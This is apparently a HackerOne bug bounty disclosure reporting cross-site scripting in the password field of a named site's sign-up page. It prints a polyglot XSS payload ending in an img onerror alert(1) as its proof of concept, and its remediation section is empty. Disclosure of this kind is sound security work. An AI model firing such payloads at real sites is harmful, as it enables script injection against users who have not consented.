# HackerOne Report: XSS in password
**Report ID:** 7995
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
http://www.localize.io/pages/sign_up
XSS in password post parameter.
used tags:
/*-->]]>%>?></object></script></title></textarea></noscript></style></xmp>'-/"/-alert(1)//><img src=1 onerror=alert(1)>'

## Discussion & Remediation Timeline
